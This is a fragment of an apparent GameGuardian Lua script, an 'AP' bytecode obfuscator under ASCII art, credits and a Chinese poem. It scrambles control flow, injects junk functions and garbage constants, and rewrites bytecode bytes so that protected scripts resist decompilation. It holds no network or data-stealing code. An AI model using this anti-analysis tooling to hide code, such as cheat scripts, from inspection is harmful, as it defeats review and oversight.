⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣆⠀⠀⠀⠀⠁⠂⠀⠤⠀⣀⠀⡀⡀⠀⠀⠀⠀⠀⠀⠀⡀⠠⠀⠁⠄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣷⣦⣠⠤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠁⠀⠀⠀⠀⡈
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣷⣿⢀⣀⠀⠀⠀⠀⣀⡀⠀⢀⢀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠰
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣋⡒⠋⠀⠈⡤⣴⢶⣮⡼⡀⠀⠀⠀⠀⠀⠀⠀⡨⣊
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⠰⣿⣿⣿⣿⣿⣿⣿⣿⣝⠲⢴⣂⠄⢰⡚⠾⢿⠶⢳⡀⠀⠀⢀⠠⣐⣼⣿⣿⣤⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⡿⠛⠛⠿⣿⣿⣿⣿⣦⣙⠻⣷⣷⣾⣭⣥⣯⣭⣽⣶⣶⣿⣿⣿⣿⣿⣿⣿⣦⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⠁⣿⣷⡓⣽⣿⡿⣿⣬⣿⣷⣧⣹⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢸⣿⣿⣿⣿⡀⢾⣿⣿⡄⢻⠇⠻⠷⢖⣿⣿⣿⣷⣦⣍⡛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢁⠀⢿⣿⣿⣿⣷⡈⠻⢿⠀⠀⠀⠀⠀⡀⠦⢬⣛⣯⣾⣿⣿⡾⢦⣍⡟⠻⢿⣿⣿⣿⣿⣿⣿⡿⠟⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢄⠙⢿⣿⣿⣷⣤⣒⢁⠀⠀⠀⡞⠀⠀⠀⠀⠀⠙⠿⠋⠀⡾⠟⢿⣿⣷⡖⠂⠀⠘⠇⣴⠒⠆
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠡⡀⠀⠀⠉⠻⢿⣻⣿⣿⠀⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡟⠀⠀⠀⡈⣸⡟⢘
⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠰⡀⠀⠀⠀⡀⠉⠻⢿⣇⠀⠀⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⣶⣶⣿⠃⠀⠀⢠⢡⣿⠇⡃⠁⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢱⡀⠀⠀⠈⠂⢀⠀⠉⠓⠄⠀⠃⠀⠀⠀⠀⠀⡀⢠⡴⢴⣿⣿⣿⠀⠀⠀⠄⣾⡿⠘⠀⠄
⠀⠀⠀⠀⠀⠀⠀⠀⢂⠀⠀⠀⢀⣧⠀⠀⠀⠀⠀⠀⠢⠀⠀⠈⠐⠀⡀⠀⠀⠀⠩⣀⣀⣤⣿⣿⣿⡀⠀⢰⣾⣿⡇⡇⠀⠉⠆
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢧⠀⠀⠀⢻⡆⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⢀⣠⢂⡀⠀⠀⠉⣻⣿⣿⣇⣿⡇⠠⢻⡟⢿⡇⡇⠀⠀⠈⡄⠐
⠈⠀⠀⠀⠀⠀⠀⠀⠀⢘⣷⡀⠀⠐⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⠟⣄⣿⣷⣶⣾⣿⣿⣿⣿⣿⡇⢀⠂⡇⠀⠓⠀⠀⠀⠀⢠⠀⠁⠀⡀
⠀⠀⠀⠀⠀⡇⠀⠀⠔⠁⠘⢿⣆⠀⠅⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠁⠀⡇⡿⣿⣭⣿⣿⣿⣿⣿⣿⡇⡆⠀⡇⠀⠀⠀⠀⠀⠀⠈⡀⢰⠬⢂
⠀⠀⠀⠀⠀⠁⡀⠀⠀⠀⠀⠀⠙⢧⡀⠀⠀⠀⠀⢠⣴⣑⢄⣸⣿⠀⠀⠁⣷⣾⣿⣿⣿⣿⣿⣿⣿⡇⡇⠘⠀⢠⠀⠀⢠⠀⠀⠀⡇⢸⡁⡁
⠀⠀⠀⠀⢀⠜⠀⠀⠀⠀⠀⠀⠀⠀⠑⢄⢘⣼⣢⠀⠿⣿⣽⣿⣿⠀⠀⠀⣏⣿⣿⣿⣿⣿⣿⣿⣿⡇⠁⠀⠀⠘⠀⠀⠸⠀⠀⠀⠀⢈⢊⠄
⠐⠄⡀⠐⠁⢂⠀⠢⡀⠀⠀⠀⠀⠀⠀⠀⠩⡛⢸⠀⠐⣿⣺⣿⣿⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢀⠃⠀⠀⠀⠀⠀⠀⠀⡤⠂
⠀⠉⠢⠀⠀⠀⠀⠀⠈⠢⠀⠀⠀⠀⠀⠀⠀⠘⡜⣶⣂⠿⣿⣿⣿⡇⠀⠀⡘⠻⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⡌⠀⠀⠀⡄⠀⠀⠀⢠⠀⠀⡴⠀⠈
⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣼⢿⢲⣿⠀⠙⢷⠀⠀⠀⠑⠪⣙⠻⣿⣿⡟⠀⡀⠀⡜⠀⠀⠀⣈⠀⠀⠀⠀⠈
⠀⠀⠀⠀⠀⠀⠀⢠⡀⠀⠀⠀⠀⠐⡀⠀⠀⠀⠀⠹⣇⢻⣯⠀⠀⠀⠑⢤⣀⡀⠀⠨⠳⣦⠍⢀⡔⢀⠜⢀⡆⠀⠀⠁⠀⠀⠀⠀⣇⣀⡀⢀⣰⠄
⠀⠀⠀⠀⠀⠀⠀⠲⡥⠀⠀⠀⠀⠀⢱⠀⠀⠀⠀⠀⠙⡆⠙⢷⡀⠀⠀⠀⠉⠳⢦⣄⠕⠁⡠⠚⠀⠁⠀⡾⠀⠀⠀⠀⠀⠀⠀⢠⡤⡄
⢀⢆⠀⠀⠀⠀⠀⠠⣷⢀⠀⠀⠀⠀⠠⡆⠀⠀⠀⠀⠀⠈⢦⠀⠹⡧⡀⠀⠀⠀⠔⢁⣤⡞⠋⠀⠀⣰⡾⠀⠀⠀⠀⢀⣀⣤⣴⣾⣿⣷⣶⡖⠐
⢸⣷⣆⠀⠀⠀⠀⠀⢿⣯⡄⠀⠀⠀⢸⣳⠀⠀⠀⠀⠀⠀⠀⠃⠀⠀⠻⢦⡀⡆⢰⣿⣿⣿⣼⣷⠟⠃⠀⠀⠀⠀⢠⣿⣿⣿⣿⣟⣿⣿⡉
⠸⠿⠾⠧⠀⠀⠀⠀⠸⠿⠷⠀⠀⠀⠀⠻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠣⠘⠷⠿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠱⠿⠿⠿⠿⠦

B꯭Y꯭阿皮꯭AP8.7꯭兼容又装逼

꯭感꯭谢꯭JS ꯭꯭ ꯭爱师鹿十七 ꯭的꯭技꯭术꯭提꯭供꯭

穷困潦倒识人真，

江山略低我一等。

故作谦卑换几时，

自此傲然与世间。

]=]..']=])'
io.open(AP[1]..".[字符串].Lua","w"):write(ty)
ty=load(ty)
ty=string.dump(ty,true,true)
TY=AP[1]..'.AP.lasm'
if not gg.internal2(load(ty),TY)then return gg.alert('加密失败')end
ty=io.open(TY,"r"):read("*a")
os.remove(TY)
local function APHX(t)
local tRet={}
local Total=#t
while Total>0 do
local i=math.random(1,Total)
table.insert(tRet,t[i])
t[i]=t[Total]
Total=Total-1
end
return tRet
end
local JMP={['EXTRAARG']=2,['MOVE']=2,['UNM']=2,['NOT']=2,['LEN']=2,['ADD']=2,['SUB']=2,['MUL']=2,['DIV']=2,['MOD']=2,['POW']=2,['GETTABLE']=2,['SETTABLE']=2,['NEWTABLE']=2,['SELF']=2,['SETLIST']=2,['LOADNIL']=2,['CONCAT']=2,['CALL']=2,['VARARG']=2,['TAILCALL']=2,['TFORCALL']=2,['GETUPVAL']=2,['SETUPVAL']=2,['GETTABUP']=2,['SETTABUP']=2,['CLOSURE']=2,['RETURN']=2,}
function JMPHX(JMP1,JMP2)
local BQ={"🚀","✈️","🛸","✈️","🛰","🚀","🛸","🛰","✈️","🚀","✈️","🛸"}
local SF=1955619037
CF=function()
return ""
end
local PZ
function PZ()
SF=SF+1
if SF>#BQ then
SF=1
end
local TAB={}
local b=gg.bytes(BQ[SF])
local tab={}
for k,v in pairs(b) do
table.insert(tab,1,string.format("%x",v))
end
tab=table.concat(tab)
tab=tab:gsub("........",function (x)
table.insert(TAB,1,"OP[48] 0x"..x.."\n")
end,1)
return "\n"..table.concat(TAB)
end
if not JMP2 then
PZ=function()
return ""
end
end
JMP1=JMP1:gsub("; .local v[^\n]+\n",""):gsub("\n%s*; .end local v[^\n]+",""):gsub("\n%s+","\n")
JMP1=JMP1:gsub("maxstacksize (%d+)(.-RETURN[^\nv]+)\n",function(max,str)
if #str>100 then
local JMP3={}
local JMP4=1000000
local JMP5={}
local JMP6={}
str=str:gsub("[^\n]+",function(s)
THZL=s:match("%S+")
local JMP7,JMP8,JMP9,HX=nil,nil,nil,nil
if THZL==".upval" or THZL == ".line"then
JMP3[#JMP3+1]=s
JMP8=true
end
if JMP4>1005000 then
HX=true
end
if THZL == "LOADK" and HX == nil then
JMP4=JMP4+1
JMP6[#JMP6+1]=":goto_"..JMP4.."\n"..s.."\nTEST v249 1\nTFORLOOP v248 :goto_"..(JMP4+1)..PZ().."\n"..CF()
JMP4=JMP4+1
JMP7=true
end
if JMP[THZL] then
JMP4=JMP4+1
if THZL == "RETURN" and s:find("v") == nil then
JMP5[#JMP5+1]=":goto_"..JMP4.."\n"..s
JMP9=true
else
JMP5[#JMP5+1]=":goto_"..JMP4.."\n"..s.."\nTEST v249 1\nTFORLOOP v248 :goto_"..(JMP4+1)..PZ().."\n"..CF()
JMP4=JMP4+1
JMP7=true
end
end
if JMP7 then
return "FORPREP v244 :goto_"..(JMP4-1).."\n:goto_"..JMP4
elseif JMP8 then
return ""
elseif JMP9 then
return "FORPREP v244 :goto_"..JMP4
else
return s
end
end)
str=":goto_1000000\n"..str
local HXAP={}
for i in str:gmatch(":goto_%d+.-FORPREP v244 :goto_%d+")do
HXAP[#HXAP+1]=i
end
str=table.concat(APHX(HXAP),"\n")
return "maxstacksize "..max.."\n"..table.concat(JMP3,"\n").."\nTFORLOOP v248 GOTO[1955]\nLOADK v244 1\nLOADK v245 1\nLOADK v246 1\nLOADBOOL v249 1\nTFORLOOP v248 :goto_1000000\n"..table.concat(APHX(JMP5),"\n").."\n"..str.."\n"..table.concat(APHX(JMP6),"\n").."\n"
else
return "maxstacksize "..max..str.."\n"
end
end)
JMP1=JMP1:gsub("\n%s+","\n")
return JMP1
end
QK={}
QK1=520520
QK2=5201314
local Q_1,Q_2,Q_3,Q_4
local QK3,QK4={},{},{}
QK5=function(QK6)
QK6=QK6:gsub("CLOSURE v0 F0","CLOSURE v0 F520520")
Q_4="\n.line 0\n"..QK6.."\n"
table.insert(QK3,Q_4)
for i=1,520 do
Q_1="\n.func F"..tostring(QK1).."\n"
Q_2="\n.source \"=?\"\n.linedefined 0\n.lastlinedefined 0\n.numparams 250\n.is_vararg 250\n.maxstacksize 250\n.upval u0 nil ; u0\n"
QK1=QK1+1
Q_3="CLOSURE v0 F"..tostring((QK1)).."\nVARARG v1\nTAILCALL v0\n"
Q_3=Q_1..Q_2..Q_3
Q_4="\n.func F"..tostring(QK2).."\n".."\n.source \"=?\"\n.linedefined 0\n.lastlinedefined 0\n.numparams 255\n.is_vararg 255\n.maxstacksize 255\n.upval u0 nil ; u0\n".."\nVARARG v1\nTAILCALL v0\n.end\n"
QK2=QK2+1
table.insert(QK3,Q_3)
table.insert(QK4,".end"..Q_4)
end
Q_1="\n.func F"..tostring(QK1).."\n"
Q_2="\n.source \"=?\"\n.linedefined 0\n.lastlinedefined 0\n.numparams 250\n.is_vararg 250\n.maxstacksize 250\n.upval u0 nil ; u0\n"
Q_3="CLOSURE v0 F0\nVARARG v1\nTAILCALL v0\n"
Q_3=Q_1..Q_2..Q_3
table.insert(QK3,Q_3)
table.insert(QK4,".end")
return table.concat(QK3,"\n")
end
if AP[3]==true then
if AP[4]==true then
ty=JMPHX(ty,true)
else
ty=JMPHX(ty)
end
soucr=load(ty)
if soucr==nil then
gg.alert("加密失败","")
print("加密失败")
io.open(TY.."[报错文件].Lua","w"):write(ty)
os.exit()
end
end
if AP[5]==true then
ty=ty:gsub("%.line 0\n(.-).func F0(.-)\n",(function(QK7,QK8)
return QK5(QK7).."\n.func F0"..QK8.."\n"
end))
ty=ty:gsub("%;%s*%]%=%=%=%=%=%=%=%=%=%](.-)%s*",(function(ty)
ty="\n"..table.concat(QK4,"\n").."\n; ]=========]"..ty
return ty
end))
ty=ty:gsub("%s*\n%s*","\n")
end
ty=ty:gsub("is_vararg[^\n]*","is_vararg 250")
ty=ty:gsub("linedefined[^\n]*","linedefined 0")
ty=ty:gsub("numparams[^\n]*","numparams 250")
ty=ty:gsub("lastlinedefined(^\n]*","lastlinedefined 0")
ty=ty:gsub("maxstacksize[^\n]*","maxstacksize 250")
if AP[6]==true then
ty=ty:gsub('(\n%s*RETURN [^\n]*)','%1\nRETURN v250..v250;\x4A\x53',1)
ty=ty:gsub('(\n%s*TAILCALL [^\n]*)','%1\nRETURN v250..v250;\x4A\x53',1)
end
if AP[7]==true then
QKCW=[=[
.upval u1 "" ; u1
.upval u9 "" ; u2
.upval u10 "" ; u3
.upval u0 "" ; u4
.upval v0 "" ; u5
.upval u11 "" ; u6
.upval u12 "" ; u7
.upval u13 "" ; u8
.upval u14 "" ; u9
.upval u15 "" ; u10
.upval u16 "" ; u11
]=]
QKCW1=[=[
.upval u1 "" ; u1
.upval u9 "" ; u2
.upval u10 "" ; u3
.upval u7 "" ; u4
.upval u6 "" ; u5
.upval u11 "" ; u6
]=]
ty=ty:gsub("upval%s*v0*%s*nil%s*;%s*%w*","upval v0 nil ; u0\n"..QKCW,1)
ty=ty:gsub("upval%s*u0*%s*nil%s*;%s*%w*","upval u0 nil ; u0\n"..QKCW1,1)
end
if AP[8]==true then
local SAPF=function()
return math.random(100,1100)
end
ty=ty:gsub("[^\n]*NEWTABLE[^\n]*",
function(txt)
return txt:gsub("(NEWTABLE v%d+) %d+ (%d+)","%1 "..SAPF().." %2")
end)
end
if AP[9]==true then
function SAN_t()
local Random=math.random(1,20)
return string.rep("�",Random)
end
TAB_SAN={}
for k=231,239 do
TAB_SAN[#TAB_SAN+1]="LOADK v"..k..' "'..SAN_t()..'"'
end
ty=ty:gsub("[^\n]*LOADK v248 0[^\n]*",function(txt)
return txt:gsub(".+",txt.."\nNEWTABLE v239 200 0\n"..table.concat(TAB_SAN,"\n").."\n")
end)
end
ty=string.gsub(string.dump(load(ty),true),"LuaR","LuaR")
ty=ty:gsub('\x9F\x3E\x00\x01','\x24\x00\x00\x00')
ty=ty:gsub("\x00\x00\x00\x00\x00\x00\x00\x00\xFA\xFA\xFA(....)\x17...",function(y)
return "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFA\xFA\xFA"..y.."\x63\xBD"..string.char(math.random(250,255),math.random(95,127))end)
ty=ty:gsub(string.char(0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFA,0xFA,0xFA),string.char(0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFA,0xFA,0xFA))
if AP[10]==true then
local TeSl=function(num)
local THSF={}
if not num then
num=math.random(30000,35000)
end
for x=1,num do
THSF[#THSF+1]=string.char(math.random(10,110))
end
return table.concat(THSF)
end
local Ren=math.random(5000,7000)+1
local x1=Ren/256
local x2=Ren%256
local Ren=TeSl(Ren-1)
ty = ty:gsub("\004\022\000\000\000消炎水笑死人了",function(x)
return "\004"..string.char(x2,x1).."\000\000"..Ren
end)
local Ner=TeSl(math.random(10000,13000)).."\x04"..string.char(x2,x1).."\x00\x00"..Ren.."\000"..TeSl(math.random(10000,13000))
local y1=(#Ner+1)/256
local y2=(#Ner+1)%256
ty=ty:gsub("\004\022\000\000\000牛马玩意笑飞我",function(x)
return "\004"..string.char(y2,y1).."\000\000"..Ner
end)
end
io.open(AP[1]..".[加密完成].lua","w"):write(ty.."\n#AP加密#")
gg.alert('加密成功\n文件为:'..AP[1],'确定')